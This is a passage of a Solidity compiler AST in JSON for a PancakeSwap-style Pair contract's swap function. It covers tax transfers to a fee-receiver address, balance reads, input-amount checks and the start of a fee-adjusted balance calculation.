																	{
																		"argumentTypes": null,
																		"id": 1970,
																		"name": "tax0",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1947,
																		"src": "13127:4:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"id": 1967,
																	"name": "_safeTransfer",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1070,
																	"src": "13092:13:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
																		"typeString": "function (address,address,uint256)"
																	}
																},
																"id": 1971,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "13092:40:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 1972,
															"nodeType": "ExpressionStatement",
															"src": "13092:40:6"
														}
													},
													{
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1976,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1974,
																"name": "amount1Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1825,
																"src": "13184:10:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1975,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "13197:1:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "13184:14:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": null,
														"id": 1983,
														"nodeType": "IfStatement",
														"src": "13180:60:6",
														"trueBody": {
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1978,
																		"name": "_token1",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1896,
																		"src": "13214:7:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1979,
																		"name": "FeeResiver",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 950,
																		"src": "13223:10:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1980,
																		"name": "tax1",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1956,
																		"src": "13235:4:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"id": 1977,
																	"name": "_safeTransfer",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1070,
																	"src": "13200:13:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
																		"typeString": "function (address,address,uint256)"
																	}
																},
																"id": 1981,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "13200:40:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 1982,
															"nodeType": "ExpressionStatement",
															"src": "13200:40:6"
														}
													},
													{
														"expression": {
															"argumentTypes": null,
															"id": 1993,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftHandSide": {
																"argumentTypes": null,
																"id": 1984,
																"name": "balance0",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1864,
																"src": "13288:8:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "Assignment",
															"operator": "=",
															"rightHandSide": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 1990,
																				"name": "this",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2355,
																				"src": "13333:4:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_contract$_Pair_$2193",
																					"typeString": "contract Pair"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_contract$_Pair_$2193",
																					"typeString": "contract Pair"
																				}
																			],
																			"id": 1989,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "13325:7:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_address_$",
																				"typeString": "type(address)"
																			},
																			"typeName": "address"
																		},
																		"id": 1991,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "13325:13:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 1986,
																				"name": "_token0",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1892,
																				"src": "13306:7:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			],
																			"id": 1985,
																			"name": "IERC20",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 533,
																			"src": "13299:6:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																				"typeString": "type(contract IERC20)"
																			}
																		},
																		"id": 1987,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "13299:15:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_IERC20_$533",
																			"typeString": "contract IERC20"
																		}
																	},
																	"id": 1988,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "balanceOf",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 494,
																	"src": "13299:25:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																		"typeString": "function (address) view external returns (uint256)"
																	}
																},
																"id": 1992,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "13299:40:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "13288:51:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 1994,
														"nodeType": "ExpressionStatement",
														"src": "13288:51:6"
													},
													{
														"expression": {
															"argumentTypes": null,
															"id": 2004,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftHandSide": {
																"argumentTypes": null,
																"id": 1995,
																"name": "balance1",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1867,
																"src": "13353:8:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "Assignment",
															"operator": "=",
															"rightHandSide": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 2001,
																				"name": "this",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2355,
																				"src": "13398:4:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_contract$_Pair_$2193",
																					"typeString": "contract Pair"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_contract$_Pair_$2193",
																					"typeString": "contract Pair"
																				}
																			],
																			"id": 2000,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "13390:7:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_address_$",
																				"typeString": "type(address)"
																			},
																			"typeName": "address"
																		},
																		"id": 2002,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "13390:13:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 1997,
																				"name": "_token1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1896,
																				"src": "13371:7:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			],
																			"id": 1996,
																			"name": "IERC20",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 533,
																			"src": "13364:6:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																				"typeString": "type(contract IERC20)"
																			}
																		},
																		"id": 1998,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "13364:15:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_IERC20_$533",
																			"typeString": "contract IERC20"
																		}
																	},
																	"id": 1999,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "balanceOf",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 494,
																	"src": "13364:25:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																		"typeString": "function (address) view external returns (uint256)"
																	}
																},
																"id": 2003,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "13364:40:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "13353:51:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 2005,
														"nodeType": "ExpressionStatement",
														"src": "13353:51:6"
													}
												]
											},
											{
												"assignments": [
													2008
												],
												"declarations": [
													{
														"constant": false,
														"id": 2008,
														"name": "amount0In",
														"nodeType": "VariableDeclaration",
														"scope": 2116,
														"src": "13424:14:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 2007,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "13424:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 2022,
												"initialValue": {
													"argumentTypes": null,
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 2013,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 2009,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1864,
															"src": "13441:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": ">",
														"rightExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 2012,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 2010,
																"name": "_reserve0",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1846,
																"src": "13452:9:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint112",
																	"typeString": "uint112"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "-",
															"rightExpression": {
																"argumentTypes": null,
																"id": 2011,
																"name": "amount0Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1823,
																"src": "13464:10:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "13452:22:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "13441:33:6",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 2020,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "13539:1:6",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"id": 2021,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "13441:99:6",
													"trueExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 2019,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 2014,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1864,
															"src": "13489:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "-",
														"rightExpression": {
															"argumentTypes": null,
															"components": [
																{
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 2017,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 2015,
																		"name": "_reserve0",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1846,
																		"src": "13501:9:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint112",
																			"typeString": "uint112"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"argumentTypes": null,
																		"id": 2016,
																		"name": "amount0Out",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1823,
																		"src": "13513:10:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "13501:22:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 2018,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "13500:24:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "13489:35:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13424:116:6"
											},
											{
												"assignments": [
													2024
												],
												"declarations": [
													{
														"constant": false,
														"id": 2024,
														"name": "amount1In",
														"nodeType": "VariableDeclaration",
														"scope": 2116,
														"src": "13550:14:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 2023,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "13550:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 2038,
												"initialValue": {
													"argumentTypes": null,
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 2029,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 2025,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1867,
															"src": "13567:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": ">",
														"rightExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 2028,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 2026,
																"name": "_reserve1",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1848,
																"src": "13578:9:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint112",
																	"typeString": "uint112"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "-",
															"rightExpression": {
																"argumentTypes": null,
																"id": 2027,
																"name": "amount1Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1825,
																"src": "13590:10:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "13578:22:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "13567:33:6",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 2036,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "13665:1:6",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"id": 2037,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "13567:99:6",
													"trueExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 2035,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 2030,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1867,
															"src": "13615:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "-",
														"rightExpression": {
															"argumentTypes": null,
															"components": [
																{
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 2033,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 2031,
																		"name": "_reserve1",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1848,
																		"src": "13627:9:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint112",
																			"typeString": "uint112"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"argumentTypes": null,
																		"id": 2032,
																		"name": "amount1Out",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1825,
																		"src": "13639:10:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "13627:22:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 2034,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "13626:24:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "13615:35:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13550:116:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 2046,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 2042,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 2040,
																	"name": "amount0In",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2008,
																	"src": "13697:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": ">",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 2041,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "13709:1:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "13697:13:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "||",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 2045,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 2043,
																	"name": "amount1In",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2024,
																	"src": "13714:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": ">",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 2044,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "13726:1:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "13714:13:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "13697:30:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a20494e53554646494349454e545f494e5055545f414d4f554e54",
															"id": 2047,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "13741:36:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_50b0a6dd250a09c1cd083ad4bf9f97424665d60e7bc0a208a1151c7d0051999c",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_INPUT_AMOUNT\""
															},
															"value": "Pancake: INSUFFICIENT_INPUT_AMOUNT"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_50b0a6dd250a09c1cd083ad4bf9f97424665d60e7bc0a208a1151c7d0051999c",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_INPUT_AMOUNT\""
															}
														],
														"id": 2039,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2328,
															2329
														],
														"referencedDeclaration": 2329,
														"src": "13676:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 2048,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13676:111:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 2049,
												"nodeType": "ExpressionStatement",
												"src": "13676:111:6"
											},
											{
												"id": 2098,
												"nodeType": "Block",
												"src": "13797:502:6",
												"statements": [
													{
														"assignments": [
															2051
														],
														"declarations": [
															{
																"constant": false,
																"id": 2051,
																"name": "balance0Adjusted",
																"nodeType": "VariableDeclaration",
																"scope": 2098,
																"src": "13887:21:6",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 2050,
																	"name": "uint",
																	"nodeType": "ElementaryTypeName",
																	"src": "13887:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 2063,
														"initialValue": {
															"argumentTypes": null,
															"components": [
																{
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"hexValue": "3235",
																					"id": 2059,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "13967:2:6",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_25_by_1",
																						"typeString": "int_const 25"
																					},
																					"value": "25"
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_rational_25_by_1",
																						"typeString": "int_const 25"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 2057,
																					"name": "amount0In",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2008,
																					"src": "13953:9:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"id": 2058,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "mul",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 2267,
																				"src": "13953:13:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																					"typeString": "function (uint256,uint256) pure returns (uint256)"
																				}
																			},
																			"id": 2060,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "13953:17:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"hexValue": "3130303030",
																					"id": 2054,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
